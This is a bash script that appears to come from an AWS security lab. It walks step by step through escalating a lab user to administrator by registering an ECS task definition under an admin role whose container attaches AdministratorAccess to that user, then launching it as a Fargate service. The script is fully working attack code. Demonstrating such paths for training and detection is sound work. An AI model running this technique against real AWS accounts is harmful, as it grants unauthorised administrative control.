#!/bin/bash

# Demo script for iam:PassRole + ecs:RegisterTaskDefinition + ecs:CreateService privilege escalation
# This scenario demonstrates how a user with PassRole, RegisterTaskDefinition, and CreateService can escalate to admin

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
STARTING_USER="pl-prod-precscs-to-admin-starting-user"
ADMIN_ROLE="pl-prod-precscs-to-admin-target-role"
TASK_DEFINITION_FAMILY="pl-precscs-admin-escalation"
TASK_EXECUTION_ROLE="pl-prod-precscs-to-admin-target-role"
SERVICE_NAME="pl-prod-precscs-attack-service"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + ECS RegisterTaskDefinition + CreateService Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_iam_passrole_ecs_registertaskdefinition_ecs_createservice.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ECS_CLUSTER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ecs_cluster_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "ECS Cluster: $ECS_CLUSTER_NAME"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Check for attached policies (should have none or minimal)
echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
echo "Listing attached policies for: $STARTING_USER"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
if [ -z "$ATTACHED_POLICIES" ]; then
    echo "No managed policies currently attached"
else
    echo "Currently attached policies: $ATTACHED_POLICIES"
fi
echo -e "${GREEN}✓ Verified current policy state${NC}\n"

# Step 6: Register ECS task definition with admin role (PassRole escalation)
echo -e "${YELLOW}Step 6: Registering ECS task definition with admin role${NC}"
echo "This is the privilege escalation vector - creating a task that uses the admin role..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"
echo "Task Family: $TASK_DEFINITION_FAMILY"

# Create task definition JSON with malicious command
# The task will attach AdministratorAccess policy to the starting user
TASK_DEFINITION=$(cat <<EOF
{
  "family": "$TASK_DEFINITION_FAMILY",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "taskRoleArn": "$ADMIN_ROLE_ARN",
  "executionRoleArn": "$ADMIN_ROLE_ARN",
  "containerDefinitions": [
    {
      "name": "escalation-container",
      "image": "amazon/aws-cli:latest",
      "essential": true,
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "$STARTING_USER",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-group": "/ecs/$TASK_DEFINITION_FAMILY",
          "awslogs-region": "$AWS_REGION",
          "awslogs-stream-prefix": "ecs",
          "awslogs-create-group": "true"
        }
      }
    }
  ]
}
EOF
)

echo "Registering task definition..."
TASK_DEF_RESULT=$(aws ecs register-task-definition \
    --region $AWS_REGION \
    --cli-input-json "$TASK_DEFINITION" \
    --output json)

if [ $? -eq 0 ]; then
    TASK_DEF_ARN=$(echo "$TASK_DEF_RESULT" | jq -r '.taskDefinition.taskDefinitionArn')
    TASK_DEF_REVISION=$(echo "$TASK_DEF_RESULT" | jq -r '.taskDefinition.revision')
    echo "Task Definition ARN: $TASK_DEF_ARN"
    echo "Revision: $TASK_DEF_REVISION"
    echo -e "${GREEN}✓ Successfully registered ECS task definition with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to register task definition${NC}"
    exit 1
fi
echo ""

# Step 7: Get default VPC and subnet for ECS service
echo -e "${YELLOW}Step 7: Finding network configuration for ECS service${NC}"

# Get default VPC
DEFAULT_VPC=$(aws ec2 describe-vpcs \
    --region $AWS_REGION \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' \
    --output text)

if [ -z "$DEFAULT_VPC" ] || [ "$DEFAULT_VPC" == "None" ]; then
    echo -e "${RED}Error: Could not find default VPC${NC}"
    echo "Please ensure a default VPC exists in region: $AWS_REGION"
    exit 1
fi

echo "Default VPC: $DEFAULT_VPC"

# Get a subnet from the default VPC
DEFAULT_SUBNET=$(aws ec2 describe-subnets \
    --region $AWS_REGION \
    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
    --query 'Subnets[0].SubnetId' \
    --output text)

if [ -z "$DEFAULT_SUBNET" ] || [ "$DEFAULT_SUBNET" == "None" ]; then
    echo -e "${RED}Error: Could not find subnet in default VPC${NC}"
    exit 1
fi

echo "Using Subnet: $DEFAULT_SUBNET"
echo -e "${GREEN}✓ Network configuration identified${NC}\n"

# Step 8: Create the ECS service
echo -e "${YELLOW}Step 8: Creating ECS service to escalate privileges${NC}"
echo "Cluster: $ECS_CLUSTER_NAME"
echo "Task Definition: $TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION"
echo "Service Name: $SERVICE_NAME"
echo "This service will launch a task that attaches AdministratorAccess policy to: $STARTING_USER"
echo ""

CREATE_SERVICE_RESULT=$(aws ecs create-service \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --service-name $SERVICE_NAME \
    --task-definition "$TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION" \
    --desired-count 1 \
    --launch-type FARGATE \
    --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" \
    --output json)

if [ $? -eq 0 ]; then
    SERVICE_ARN=$(echo "$CREATE_SERVICE_RESULT" | jq -r '.service.serviceArn')
    echo "Service ARN: $SERVICE_ARN"
    echo -e "${GREEN}✓ Successfully created ECS service!${NC}"
else
    echo -e "${RED}Error: Failed to create ECS service${NC}"
    exit 1
fi
echo ""

# Step 9: Wait for service to launch task and complete
echo -e "${YELLOW}Step 9: Waiting for ECS service to launch and complete task${NC}"
echo "Monitoring service status..."

MAX_ATTEMPTS=30
ATTEMPT=0
SERVICE_STATUS="UNKNOWN"

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    ATTEMPT=$((ATTEMPT + 1))

    # Get service status
    SERVICE_INFO=$(aws ecs describe-services \
        --region $AWS_REGION \
        --cluster $ECS_CLUSTER_NAME \
        --services $SERVICE_NAME \
        --output json 2>/dev/null)

    if [ $? -eq 0 ]; then
        SERVICE_STATUS=$(echo "$SERVICE_INFO" | jq -r '.services[0].status')
        RUNNING_COUNT=$(echo "$SERVICE_INFO" | jq -r '.services[0].runningCount')
        DESIRED_COUNT=$(echo "$SERVICE_INFO" | jq -r '.services[0].desiredCount')

        echo "Attempt $ATTEMPT: Service status: $SERVICE_STATUS (running: $RUNNING_COUNT, desired: $DESIRED_COUNT)"

        # Check if service has launched a task (must have at least one running task)
        if [ "$SERVICE_STATUS" == "ACTIVE" ] && [ "$RUNNING_COUNT" -gt 0 ]; then
            echo -e "${GREEN}✓ Service is active and task is running!${NC}"

            # Get the task ARN to monitor it
            TASK_ARN=$(aws ecs list-tasks \
                --region $AWS_REGION \
                --cluster $ECS_CLUSTER_NAME \
                --service-name $SERVICE_NAME \
                --query 'taskArns[0]' \
                --output text)

            if [ -n "$TASK_ARN" ] && [ "$TASK_ARN" != "None" ]; then
                echo "Task ARN: $TASK_ARN"
                echo "Waiting for task to complete execution..."

                # Wait for task to complete (it should finish quickly)
                TASK_WAIT=0
                MAX_TASK_WAIT=60
                while [ $TASK_WAIT -lt $MAX_TASK_WAIT ]; do
                    TASK_WAIT=$((TASK_WAIT + 1))

                    TASK_INFO=$(aws ecs describe-tasks \
                        --region $AWS_REGION \
                        --cluster $ECS_CLUSTER_NAME \
                        --tasks $TASK_ARN \
                        --output json 2>/dev/null)

                    if [ $? -eq 0 ]; then
                        TASK_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].lastStatus')
                        echo "  Task status: $TASK_STATUS (wait $TASK_WAIT/$MAX_TASK_WAIT)"

                        # Check if task has stopped (completed)
                        if [ "$TASK_STATUS" == "STOPPED" ]; then
                            EXIT_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].containers[0].exitCode')
                            echo -e "${GREEN}✓ Task completed with exit code: $EXIT_CODE${NC}"
                            break
                        fi
                    fi

                    sleep 2
                done

                if [ $TASK_WAIT -ge $MAX_TASK_WAIT ]; then
                    echo -e "${YELLOW}⚠ Warning: Task did not complete within expected time${NC}"
                fi
            fi
            break
        fi
    else
        echo "Warning: Could not describe service (attempt $ATTEMPT)"
    fi

    sleep 5
done

if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then
    echo -e "${YELLOW}⚠ Warning: Timeout waiting for service to become active${NC}"
    echo "Continuing anyway - the policy may have been attached..."
fi
echo ""

# Step 10: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 10: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take time to propagate across AWS infrastructure..."
sleep 15
echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"

# Step 11: Verify policy was attached to starting user
echo -e "${YELLOW}Step 11: Verifying policy attachment${NC}"
echo "Checking attached policies for: $STARTING_USER"

ATTACHED_POLICIES_AFTER=$(aws iam list-attached-user-policies \
    --user-name $STARTING_USER \
    --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    --output text)

if [ -z "$ATTACHED_POLICIES_AFTER" ]; then
    echo -e "${RED}⚠ Warning: No policies found attached to user${NC}"
    echo "The ECS task may not have completed successfully"
else
    echo "Currently attached policies:"
    echo "$ATTACHED_POLICIES_AFTER"

    if echo "$ATTACHED_POLICIES_AFTER" | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ AdministratorAccess policy successfully attached!${NC}"
    else
        echo -e "${YELLOW}⚠ AdministratorAccess not found in attached policies${NC}"
    fi
fi
echo ""

# Step 12: Verify admin access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "The privilege escalation may not have completed successfully"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, ecs:RegisterTaskDefinition, ecs:CreateService)"
echo "2. Registered ECS task definition with admin role: $ADMIN_ROLE"
echo "3. Task definition configured to attach AdministratorAccess to starting user"
echo "4. Created ECS service on Fargate to execute the privilege escalation"
echo "5. ECS service launched task that attached AdministratorAccess policy to starting user"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (PassRole + RegisterTaskDefinition + CreateService)"
echo "  → ECS Service with $ADMIN_ROLE → AttachUserPolicy"
echo "  → $STARTING_USER gains AdministratorAccess → Admin"

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS Task Definition: $TASK_DEFINITION_FAMILY (revision $TASK_DEF_REVISION)"
echo "- ECS Service: $SERVICE_NAME"
echo "- ECS Cluster: $ECS_CLUSTER_NAME"
echo "- Service ARN: $SERVICE_ARN"
echo "- Policy attached to user: AdministratorAccess"

echo -e "\n${RED}⚠ Warning: The starting user now has AdministratorAccess policy attached${NC}"
echo -e "${RED}⚠ The ECS service and task definition are still active${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""
